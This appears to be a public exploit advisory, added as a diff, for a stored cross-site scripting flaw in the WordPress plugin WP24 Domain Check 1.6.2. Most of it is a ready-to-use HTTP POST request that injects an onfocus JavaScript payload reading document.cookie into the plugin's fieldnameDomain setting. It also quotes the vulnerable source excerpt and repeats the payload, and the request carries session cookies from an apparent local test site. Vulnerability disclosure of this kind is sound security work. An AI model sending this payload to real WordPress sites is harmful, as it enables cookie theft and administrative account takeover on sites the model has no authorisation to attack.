@@ -1,0 +1,49 @@
+# Exploit Title: WordPress Plugin WP24 Domain Check 1.6.2 - 'fieldnameDomain' Stored Cross Site Scripting
+# Date: 2021-01-03
+# Exploit Author: Mehmet Kelepçe / Gais Cyber Security
+# Vendor Homepage: https://wordpress.org/plugins/wp24-domain-check/
+# Software Link: https://wordpress.org/plugins/wp24-domain-check/
+# Version: 1.6.2
+# Tested on: Apache2 - Windows 10
+
+Vulnerable param: wp24_domaincheck[fieldnameDomain]
+-------------------------------------------------------------------------
+POST /w12ee3/wp-admin/options.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/w12ee3/wp-admin/options-general.php?page=wp24_domaincheck_settings&tab=advanced
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 415
+Origin: http://localhost
+Connection: close
+Cookie: wordpress_a25e758b4b8611d32cffab04f654ade8=admin%7C1610108483%7C9JXQJh8k8MPmNowV0sLR7zP5q0hyjw2rpi8fp0wdZNa%7C9bd3e4806dbb6058ca887771af1d82b5d04ad6c3d14f8f6f88d9604ad12ae500; wordpress_logged_in_a25e758b4b8611d32cffab04f654ade8=admin%7C1610108483%7C9JXQJh8k8MPmNowV0sLR7zP5q0hyjw2rpi8fp0wdZNa%7C8edadaf3ba084ba1d6cb6257a460f043efde74e8bcd9817826faf9ad80271d1e; wp-settings-time-1=1609659595; bp_user-role=administrator; bp_user-registered=1608898152000; bp_ut_session=%7B-q-pageviews-q-%3A1-c--q-referrer-q-%3A-q--q--c--q-landingPage-q-%3A-q-http%3A%2F%2Flocalhost%2Fw12ee3%2F-q--c--q-started-q-%3A1609657029216%7D
+Upgrade-Insecure-Requests: 1
+
+update_advanced_settings=1&option_page=wp24_domaincheck&action=update&_wpnonce=8dcf91df50&_wp_http_referer=/w12ee3/wp-admin/options-general.php?page=wp24_domaincheck_settings&tab=advanced&wp24_domaincheck%5BhtmlForm%5D=1&wp24_domaincheck[fieldnameDomain]=111%22+onfocus%3Dalert%28document.cookie%29%3B+on%3D&wp24_domaincheck%5BfieldnameTld%5D=domaincheck_tld&submit=De%C4%9Fi%C5%9Fiklikleri+kaydet
+
+Source Code:
+
+\wp-content\plugins\wp24-domain-check\includes\class-wp24-settings.php:
+--------------------------------------------------------------------
+                // fieldnameDomain
+                                add_settings_field(
+                                                'fieldnameDomain',
+                                                __( 'Domain fieldname', 'wp24-domaincheck' ),
+                                                array( $this, 'inputfield' ),
+                                                'settings_advanced',
+                                                'section_advanced_form',
+                                                array(
+                                                                'name' => 'fieldnameDomain',
+                                                                'type' => 'textfield',
+                                                )
+                                );
+Vulnerable: 'name' => 'fieldnameDomain'
+
+-------------------------------------------------------------------------
+
+Payload:
+111" onfocus=alert(document.cookie); on=
+-------------------------------------------------------------------------
